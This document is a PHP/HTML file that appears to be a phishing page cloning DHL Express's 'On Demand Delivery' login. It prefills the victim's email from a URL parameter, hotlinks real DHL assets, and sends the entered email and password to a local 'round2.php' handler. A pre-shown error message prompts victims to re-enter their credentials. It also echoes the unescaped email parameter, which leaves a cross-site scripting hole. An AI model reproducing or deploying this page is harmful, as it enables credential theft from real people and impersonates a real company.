<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html dir="ltr" lang="en"><head id="j_idt2">
    <title>On Demand Delivery</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" sizes="57x57" href="https://delivery.dhl.com/img/icons/apple-touch-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="https://delivery.dhl.com/img/icons/apple-touch-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="https://delivery.dhl.com/img/icons/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="https://delivery.dhl.com/img/icons/apple-touch-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="https://delivery.dhl.com/img/icons/apple-touch-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="https://delivery.dhl.com/img/icons/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="https://delivery.dhl.com/img/icons/apple-touch-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="https://delivery.dhl.com/img/icons/apple-touch-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://delivery.dhl.com/img/icons/apple-touch-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192" href="https://delivery.dhl.com/img/icons/favicon-192x192.png">
  <link rel="icon" type="image/png" sizes="160x160" href="https://delivery.dhl.com/img/icons/favicon-160x160.png">
  <link rel="icon" type="image/png" sizes="96x96" href="https://delivery.dhl.com/img/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="64x64" href="https://delivery.dhl.com/img/icons/favicon-64x64.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://delivery.dhl.com/img/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://delivery.dhl.com/img/icons/favicon-16x16.png">
  <link rel="manifest" id="odd-manifest" href="blob:https://delivery.dhl.com/fc7c8e48-11c9-4cf7-9bea-6afb6f4a58e3">
  <link rel="mask-icon" href="https://delivery.dhl.com/img/icons/safari-pinned-tab.svg" color="#d40511">
  <link rel="shortcut icon" href="https://delivery.dhl.com/img/icons/favicon.ico">
  <meta name="apple-mobile-web-app-title" content="On Demand Delivery">
  <meta name="application-name" content="On Demand Delivery">
  <meta name="msapplication-config" content="/img/icons/browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  <script type="text/javascript">
		/* <![CDATA[ */
		   var dhleAndroidId = 'com.dhl.exp.dhlmobile';
		   var dhleEnabled = false;
		   
		   // Launch the screen shortcut without standalone display, similar to usual browser
		   var oddDynamicManifest = {
				    "name": "On Demand Delivery"
				}
		   
		   // Change manifest content if DHLE is enabled, to display android smart banner
		   if (dhleEnabled && typeof dhleAndroidId !== 'undefined' && dhleAndroidId !== '') {
			   oddDynamicManifest = {
					    "name": "On Demand Delivery",				    
					    "prefer_related_applications": true,
					    "related_applications": [
					        {
					            "platform": "play",
					            "id": dhleAndroidId
					        }
					    ]
					}
		   }
		   
		   const stringManifest = JSON.stringify(oddDynamicManifest);
		   const blob = new Blob([stringManifest], {type: 'application/json'});
		   const manifestURL = URL.createObjectURL(blob);
		   document.querySelector('#odd-manifest').setAttribute('href', manifestURL);
		/* ]]> */
  </script>
    <link rel="stylesheet" type="text/css" href="jsp/login.css">
    <script type="text/javascript" src="jsp/login.js"></script>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" src="jsp/jsf.xhtml"></script><link type="text/css" rel="stylesheet" href="jsp/default.css"><script type="text/javascript" src="jsp/util.xhtml"></script><script type="text/javascript">O$.initDefaultFocus('o::defaultFocus', null);</script><script type="text/javascript" src="jsp/ajaxUtil.xhtml"></script><script type="text/javascript">O$.Ajax.setMessageHTML('\x3Ctable class=\x27o_ajax_message  \x27 style=\x27 \x27 cellpadding=\x270\x27 cellspacing=\x270\x27>\x3Ctr>\x3Ctd valign=\x27middle\x27 style=\x27padding-right: 5px\x27>\x3Cimg src=\x27/javax.faces.resource/loading.gif.xhtml?ln=openfaces&v=20200220\x27/>\x3C/td>\x3Ctd valign=\x27middle\x27>Loading...\x3C/td>\x3C/tr>\x3C/table>', 'right', 'top', 0.0, 0, null, true);</script><script type="text/javascript" src="jsp/floatingIconMessage.xhtml"></script></head><body class="  pace-running pace-running pace-done" style=""><div class="pace  pace-inactive"><div class="pace-progress" style="transform: translate3d(100%, 0px, 0px);" data-progress-text="100%" data-progress="99">
  <div class="pace-progress-inner"></div>
</div>
<div class="pace-activity"></div></div>
	<input type="hidden" value="false">  
	<input type="hidden">
  <nav id="main-menu">
    
      
      <header id="menu-header">
        <button id="menu-close-btn" class="hamburger hamburger--squeeze hamburger--active" type="button" aria-label="Close Menu" aria-controls="navigation">
          <span class="hamburger-box">
            <span class="hamburger-inner"></span>
          </span>
        </button>

        <span>
<form id="language-form" name="language-form" method="post" action="round2.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="language-form" value="language-form">
<input type="hidden" name="csrfId" value="7c7f94e3d1264f8e40c6c42cd15a290cb870adff7cbf503b134b1fd5d85025ae">
          <ul class="language-list">
              <li class="language-item is-selected">en
              </li>
              <li class="language-item "><a href="#" onclick="mojarra.jsfcljs(document.getElementById('language-form'),{'language-form:j_idt24:1:j_idt26':'language-form:j_idt24:1:j_idt26'},'');return false">es</a>
              </li>
          </ul><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-1408157037508719701:-819538412731074244" autocomplete="off">
<input type="hidden" id="o::defaultFocus" name="o::defaultFocus" value="loginForm:btn-login"></form>
        </span><span id="menu-countryselect">
<form id="country-form" name="country-form" method="post" action="/login.xhtml" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="country-form" value="country-form">
<input type="hidden" name="csrfId" value="7c7f94e3d1264f8e40c6c42cd15a290cb870adff7cbf503b134b1fd5d85025ae">
  <div class="dropdown">
    <button id="countrySelector" class="button-dropdown" type="button" data-toggle="dropdown" tabindex="1">
      <span class="has-icon icon-globe"></span>
      <span data-bind="label">United States</span>
      <span class="has-icon icon-arrow-down"></span>
    </button>
    <ul class="dropdown-menu" role="menu">

      <li id="amtop" role="presentation" class="have-child">
        <a role="menuitem" tabindex="-1" data-toggle="collapse" data-parent="#accordion" href="#am" class="active">
          <i class="has-icon icon-minus"></i>
          Americas
        </a>
        <ul id="am" class="panel-collapse in" style="height: auto;">
            <li data-option="AR">Argentina
            </li>
            <li data-option="BS">Bahamas
            </li>
            <li data-option="BB">Barbados
            </li>
            <li data-option="BM">Bermuda
            </li>
            <li data-option="BO">Bolivia
            </li>
            <li data-option="BR">Brazil
            </li>
            <li data-option="VG">British Virgin Islands
            </li>
            <li data-option="CA">Canada
            </li>
            <li data-option="KY">Cayman Islands
            </li>
            <li data-option="CL">Chile
            </li>
            <li data-option="CO">Colombia
            </li>
            <li data-option="CR">Costa Rica
            </li>
            <li data-option="XC">Curaçao
            </li>
            <li data-option="DO">Dominican Republic
            </li>
            <li data-option="EC">Ecuador
            </li>
            <li data-option="SV">El Salvador
            </li>
            <li data-option="GF">French Guiana
            </li>
            <li data-option="GP">Guadeloupe
            </li>
            <li data-option="GT">Guatemala
            </li>
            <li data-option="HT">Haiti
            </li>
            <li data-option="HN">Honduras
            </li>
            <li data-option="JM">Jamaica
            </li>
            <li data-option="MQ">Martinique
            </li>
            <li data-option="MX">Mexico
            </li>
            <li data-option="NI">Nicaragua
            </li>
            <li data-option="PA">Panama
            </li>
            <li data-option="PY">Paraguay
            </li>
            <li data-option="PE">Peru
            </li>
            <li data-option="PR">Puerto Rico
            </li>
            <li data-option="XM">Sint Maarten (Dutch part)
            </li>
            <li data-option="TT">Trinidad and Tobago
            </li>
            <li data-option="US" class="selected">United States
            </li>
            <li data-option="VI">U.S. Virgin Islands
            </li>
            <li data-option="UY">Uruguay
            </li>
            <li data-option="VE">Venezuela
            </li>
        </ul>
      </li>

      <li role="presentation" class="divider"></li>

      <li id="aptop" role="presentation" class="have-child">
        <a role="menuitem" tabindex="-1" data-toggle="collapse" data-parent="#accordion" href="#ap">
          <i class="has-icon icon-plus"></i>
          Asia Pacific
        </a>
        <ul id="ap" class="panel-collapse collapse">
            <li data-option="AU">Australia
            </li>
            <li data-option="KH">Cambodia
            </li>
            <li data-option="CN">China
            </li>
            <li data-option="HK">Hong Kong
            </li>
            <li data-option="IN">India
            </li>
            <li data-option="ID">Indonesia
            </li>
            <li data-option="JP">Japan
            </li>
            <li data-option="MO">Macao
            </li>
            <li data-option="MY">Malaysia
            </li>
            <li data-option="NZ">New Zealand
            </li>
            <li data-option="PK">Pakistan
            </li>
            <li data-option="PH">Philippines
            </li>
            <li data-option="SG">Singapore
            </li>
            <li data-option="KR">South Korea
            </li>
            <li data-option="LK">Sri Lanka
            </li>
            <li data-option="TW">Taiwan
            </li>
            <li data-option="TH">Thailand
            </li>
            <li data-option="VN">Vietnam
            </li>
        </ul>
      </li>

      <li role="presentation" class="divider"></li>

      <li id="eumetop" role="presentation" class="have-child">
        <a role="menuitem" tabindex="-1" data-toggle="collapse" data-parent="#accordion" href="#eume">
          <i class="has-icon icon-plus"></i>
          Europe
        </a>
        <ul id="eume" class="panel-collapse collapse">
            <li data-option="AL">Albania
            </li>
            <li data-option="AT">Austria
            </li>
            <li data-option="BE">Belgium
            </li>
            <li data-option="BA">Bosnia and Herzegovina
            </li>
            <li data-option="BG">Bulgaria
            </li>
            <li data-option="HR">Croatia
            </li>
            <li data-option="CY">Cyprus
            </li>
            <li data-option="CZ">Czech Republic
            </li>
            <li data-option="DK">Denmark
            </li>
            <li data-option="EE">Estonia
            </li>
            <li data-option="FI">Finland
            </li>
            <li data-option="FR">France
            </li>
            <li data-option="DE">Germany
            </li>
            <li data-option="GI">Gibraltar
            </li>
            <li data-option="GR">Greece
            </li>
            <li data-option="GG">Guernsey
            </li>
            <li data-option="HU">Hungary
            </li>
            <li data-option="IS">Iceland
            </li>
            <li data-option="IE">Ireland
            </li>
            <li data-option="IL">Israel
            </li>
            <li data-option="IT">Italy
            </li>
            <li data-option="JE">Jersey
            </li>
            <li data-option="KZ">Kazakhstan
            </li>
            <li data-option="LV">Latvia
            </li>
            <li data-option="LT">Lithuania
            </li>
            <li data-option="LU">Luxembourg
            </li>
            <li data-option="MK">Macedonia
            </li>
            <li data-option="MT">Malta
            </li>
            <li data-option="MD">Moldova
            </li>
            <li data-option="NL">Netherlands
            </li>
            <li data-option="NO">Norway
            </li>
            <li data-option="PL">Poland
            </li>
            <li data-option="PT">Portugal
            </li>
            <li data-option="RO">Romania
            </li>
            <li data-option="RU">Russia
            </li>
            <li data-option="RS">Serbia
            </li>
            <li data-option="SK">Slovakia
            </li>
            <li data-option="SI">Slovenia
            </li>
            <li data-option="ES">Spain
            </li>
            <li data-option="SE">Sweden
            </li>
            <li data-option="CH">Switzerland
            </li>
            <li data-option="TR">Turkey
            </li>
            <li data-option="UA">Ukraine
            </li>
            <li data-option="GB">United Kingdom
            </li>
        </ul>
      </li>

      <li role="presentation" class="divider"></li>

      <li id="metop" role="presentation" class="have-child">
        <a role="menuitem" tabindex="-1" data-toggle="collapse" data-parent="#accordion" href="#me">
          <i class="has-icon icon-plus"></i>
          Middle East &amp; Africa
        </a>
        <ul id="me" class="panel-collapse collapse">
            <li data-option="DZ">Algeria
            </li>
            <li data-option="BH">Bahrain
            </li>
            <li data-option="EG">Egypt
            </li>
            <li data-option="ET">Ethiopia
            </li>
            <li data-option="GH">Ghana
            </li>
            <li data-option="IR">Iran
            </li>
            <li data-option="JO">Jordan
            </li>
            <li data-option="KE">Kenya
            </li>
            <li data-option="KW">Kuwait
            </li>
            <li data-option="LB">Lebanon
            </li>
            <li data-option="MU">Mauritius
            </li>
            <li data-option="MA">Morocco
            </li>
            <li data-option="NG">Nigeria
            </li>
            <li data-option="OM">Oman
            </li>
            <li data-option="QA">Qatar
            </li>
            <li data-option="SA">Saudi Arabia
            </li>
            <li data-option="ZA">South Africa
            </li>
            <li data-option="TZ">Tanzania
            </li>
            <li data-option="UG">Uganda
            </li>
            <li data-option="AE">United Arab Emirates
            </li>
        </ul>
      </li>

      <li role="presentation" class="divider"></li>
    </ul>
  </div><span id="country-form:selectedCountryName" style="display:none">United States</span><input id="country-form:selectedCountryCode" type="hidden" name="country-form:selectedCountryCode" value="US"><input id="country-form:update-country" type="submit" name="country-form:update-country" value="" style="display:none"><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:1" value="-1408157037508719701:-819538412731074244" autocomplete="off">
</form></span>
      </header>
      
      <ul class="menu-list">
        <li class="menu-item ">
          <a id="menu-shipments" href="https://delivery.dhl.com/shipments.xhtml" class="menu-item-link">My shipments
          </a>
        </li>
        <li class="menu-item ">
          <a id="menu-instruct" href="https://delivery.dhl.com/customer/standing-instruction.xhtml" class="menu-item-link">Delivery preference
          </a>
        </li>
        <li class="menu-item ">
          <a id="menu-settings" href="https://delivery.dhl.com/customer/settings.xhtml" class="menu-item-link">Settings
          </a>
        </li>
        <li class="menu-item ">
          <a id="menu-whatis" href="#" class="menu-item-link">Help
          </a>
        </li>
        <li class="menu-item ">
          <a id="menu-legal" href="https://delivery.dhl.com/legal.xhtml" class="menu-item-link">Contact and legal
          </a>
        </li>
        <li class="menu-item">
          <a id="menu-signup" href="https://delivery.dhl.com/login.xhtml" class="menu-item-link">Sign up or login now
            <span class="has-icon icon-arrow-link"></span>
          </a>
        </li>
      </ul>
      
      <footer class="menu-footer">
        <span>DHL Express On Demand Delivery v1.5.0<img class="beta-icon" src="jsp/beta-icon.svg"></span>
      </footer>
  </nav>
	
	  <div class="modal fade" id="sideMenuHelpModel" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
	    <div class="modal-dialog linguisticHelpModel">
	      <div class="modal-content">
	        <div class="modal-header helpModalHeader">
	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="jsp/icon-close.png"> </button>
	          <h4 class="helpmodal-title mt-10 mb-10" id="myModalLabel">Help</h4>
	        </div>
	        <div id="sideMenuHelpContent" class="modal-body linguisticHelpModelBody">
	        </div>
	      </div>
	      
	    </div>
	    
	  <div id="extwaiimpotscp" style="display:none" v="{8078" f="ZXpnd056Z3pNMlE1TFRobFlUY3ROREptT0MxaE9HRTBMVFEyWm1ZM05URTVaR1E0WW4wPQ==" q="bad00d1b" c="227.5" i="237.5" u="15.61" s="20022102" w="false" m="BMe=" vn="0ytd2"></div></div>
    <section id="main-wrapper">
      <header id="main-header" class="row">
              
              <button id="menu-open-btn" class="hamburger hamburger--squeeze" type="button" aria-label="Open Menu" aria-controls="navigation">
                <span class="hamburger-box">
                  <span class="hamburger-inner"></span>
                </span>
              </button><span id="header-title" class="header-title"></span>
      </header>
      <section id="main-body" class="login-bg">
    <section id="login-body" class="row">
      <div class="col-xs-24">
        <img src="jsp/dhl_logo.svg" class="logo-dhl is-centered img-responsive" alt="DHL">
      </div>
      <div class="col-xs-24">
        <img src="jsp/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
      </div>
<form id="loginForm" name="loginForm" method="post" action="round2.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="loginForm" value="loginForm">
<input type="hidden" name="csrfId" value="7c7f94e3d1264f8e40c6c42cd15a290cb870adff7cbf503b134b1fd5d85025ae">
        <div class="row login-input-group">
          
          <div class="col-xs-24 mb-15"><input placeholder="Email or mobile" id="loginForm:emailPhone" type="text" name="loginForm:emailPhone" value="<?php echo $_GET['email']; ?>" tabindex="1"><span id="loginForm:emailPhone-error" style="display: none;" class="input-error"></span>
          </div>
          <div class="col-xs-24 mb-5"><div id="loginForm:password-field" class="login-button-combo col-xs-24 input-focus"><input placeholder="Password" type="password" id="loginForm:password" name="loginForm:password" value="" class="password-toggle" tabindex="2">
              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="jsp/eyehide.svg" data-toggle-src="jsp/eyeshow.svg"></div><span id="loginForm:password-field-error" class="input-error">Please correct your email or mobile and/or password</span>
          </div>
          <div class="col-xs-24">
            <a id="linkPass" href="https://delivery.dhl.com/forgot-password.xhtml" class="" tabindex="3">Forgot password?</a>
          </div>
        </div>
        <div class="col-xs-24 mb-15"><input id="loginForm:selectedCountryName" type="hidden" name="loginForm:selectedCountryName" value="United States"><input id="loginForm:selectedCountryCode" type="hidden" name="loginForm:selectedCountryCode" value="US"><input id="loginForm:btn-login" type="submit" name="loginForm:btn-login" value="LOGIN" tabindex="4" class="base-button is-center" onclick="mojarra.ab(this,event,'action','@form','@form',{'onevent':showProgress,'redirect':''});return false">
        </div>
<input type="hidden" name="javax.faces.ViewState" value="-1408157037508719701:-819538412731074244"></form>
      <div class="col-xs-24 mt-15">
        <h4 class="content-title nopadding">NOT YET A MEMBER?</h4>
      </div>
      <div class="col-xs-24 mb-10">Sign up now to manage your shipments</div>
      
      <div class="col-xs-24 mb-10">
        <a id="btnSign" href="https://delivery.dhl.com/register-step1.xhtml" class="base-button base-button--white is-center" tabindex="5">SIGN UP</a>
      </div>
      <div class="col-xs-24 mt-5 text-center">
        <a id="btnManage" href="https://delivery.dhl.com/waybill.xhtml?ctrycode=US" class="" tabindex="6">Manage shipment as a guest</a><br>
      </div>
    </section>
      </section>
      <footer id="main-footer" class="row">
        <div class="col-xs-8 nopadding">
          <img src="jsp/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
        </div>
        <div class="col-xs-16 nopadding">
          <span class="copyright">DHL Express 2020 © DHL International GmbH. All rights reserved.
          </span>
        </div>
      </footer>
    </section><script src="jsp/confirmation.xhtml" type="text/javascript"></script><script type="text/javascript">
O$.Ajax.setMessageHTML('\x3Ctable class=\x27o_ajax_message  \x27 style=\x27display:none\x27 cellpadding=\x270\x27 cellspacing=\x270\x27>\x3Ctr>\x3Ctd valign=\x27middle\x27 style=\x27padding-right: 5px\x27>\x3Cimg src=\x27/javax.faces.resource/loading.gif.xhtml?ln=openfaces&v=20200220\x27/>\x3C/td>\x3Ctd valign=\x27middle\x27>Loading...\x3C/td>\x3C/tr>\x3C/table>', 'right', 'top', 0.0, 0, null, true);
</script>
    <script src="jsp/pace.js" type="text/javascript"></script>
<div style="position: absolute; z-index: 1000; left: 1600px; top: 0px; display: none;"><table class="o_ajax_message  " style="display:none" cellspacing="0" cellpadding="0"><tbody><tr><td style="padding-right: 5px" valign="middle"><img src="jsp/loading.gif"></td><td valign="middle">Loading...</td></tr></tbody></table></div></body></html>